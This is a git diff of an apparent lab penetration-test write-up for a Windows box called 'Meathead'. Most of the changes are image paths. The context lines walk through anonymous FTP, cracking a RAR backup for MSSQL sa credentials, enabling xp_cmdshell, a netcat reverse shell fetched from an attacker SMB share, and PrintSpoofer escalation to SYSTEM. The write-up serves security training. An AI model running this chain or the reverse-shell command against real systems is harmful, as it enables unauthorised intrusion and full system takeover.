@@ -3,7 +3,7 @@ Alias: Meathead
 Date: 7/1/22
 Platform: Windows
 Difficulty: Hard
-Tags: #FTPAnoymousLogin #msqlclient.py 
+Tags: #FTPAnoymousLogin #msqlclient.py #SMBServer.py #xp_cmdshell #PrintSpoofer64PrivilegeEscalation
 Status: Finished
 IP: 192.168.114.70
 ---
@@ -188,19 +188,19 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to target IP address and found the following Plantronics login webpage:
 
-![](Pasted%20image%2020221020002407.png)
+![](Images/Pasted%20image%2020221020002407.png)
 
 
 #### - Typed "searchsploit Plantronics" and found the following privilege escalation exploit:
 
-![](Pasted%20image%2020221020002530.png)
+![](Images/Pasted%20image%2020221020002530.png)
 
 ## PORT 1221 - Microsoft ftpd
 #### - Per the nmap scan it shows we are able login anonymously via ftp
 
 #### - Typed "ftp 192.168.114.70 -p 1221" used anonymous as user and anonymous as password and found the following files:
 
-![](Pasted%20image%2020221020003245.png)
+![](Images/Pasted%20image%2020221020003245.png)
 
 #### - Typed "mget MSSQL_BAK.rar" to download the file to my kali machine
 
@@ -209,14 +209,14 @@ Enumerated top 200 UDP ports:
 #### - Typed "rar2john MSSQL_BAK.rar > back.hash" to retreive the rar file password hash and input it into the back.hash file
 
 #### - Typed "john back.hash --wordlist=/usr/share/wordlists/rockyou.txt" and found password "letmeinplease"
-![](Pasted%20image%2020221020003414.png)
+![](Images/Pasted%20image%2020221020003414.png)
 
 #### - Typed "unrar e MSSQL_BAK.rar -p " and entered password "letmeinplease"
 
-![](Pasted%20image%2020221020003518.png)
+![](Images/Pasted%20image%2020221020003518.png)
 
 #### - And found username "sa" and password "EjectFrailtyThorn425"
-![](Pasted%20image%2020221020003738.png)
+![](Images/Pasted%20image%2020221020003738.png)
 ---
 
 # Exploitation
@@ -225,35 +225,35 @@ Enumerated top 200 UDP ports:
 
 #### - Logged into ms-sql by typing "mssqlclient.py -p 1435 sa:EjectFrailtyThorn425@192.168.114.70"
 
-![](Pasted%20image%2020221020004521.png)
+![](Images/Pasted%20image%2020221020004521.png)
 #MicrosoftSQLServerReverseShellExploit
 
 #### - Typed "help" and found the following commands I can input:
-![](Pasted%20image%2020221020004819.png)
+![](Images/Pasted%20image%2020221020004819.png)
 
 
 #### - Typed "enable_xp_cmdshell" 
 
-![](Pasted%20image%2020221020010406.png)
+![](Images/Pasted%20image%2020221020010406.png)
 
 #### - Typed "enable_xp_cmdshell system info" and found the system architecture to be x64 bit
 
 #### - Typed "xp_cmdshell" and found we were in directory "C:\Windows\system32"
 
-![](Pasted%20image%2020221020010503.png)
+![](Images/Pasted%20image%2020221020010503.png)
 
 #### - I attempted to get a reverse shell using "curl.exe" and "certultil.exe" as I was able to find both within system32 directory but had no luck
 
 #### - I then started an smb share hosting "nc64.exe" file on my kali machine by typing "smbserver.py Share /home/kali/Downloads":
 
-![](Pasted%20image%2020221020010606.png)
+![](Images/Pasted%20image%2020221020010606.png)
 #SMBServer.pyShare
 
 #### - I then started a netcat listener on my kali machine listening on port 3389
 
 #### - I then typed "xp_cmdshell \\[Kali IP]\Share\nc64.exe -e cmd.exe 192.168.49.114 3389" on the mssql target machine and received a reverse shell on the listener:
 
-![](Pasted%20image%2020221020010759.png)
+![](Images/Pasted%20image%2020221020010759.png)
 
 
 ---
@@ -263,7 +263,7 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "whoami /priv" and found SeImpersonatePrivilege was enabled:
 
-![](Pasted%20image%2020221020011101.png)
+![](Images/Pasted%20image%2020221020011101.png)
 #SeImpersonatePrivilege 
 
 ## Privilege Escalation vector
@@ -276,7 +276,7 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "PrintSpoofer64.exe -i -c cmd" and received a shell running with system privileges:
 
-![](Pasted%20image%2020221020011216.png)
+![](Images/Pasted%20image%2020221020011216.png)
 
 
 ---
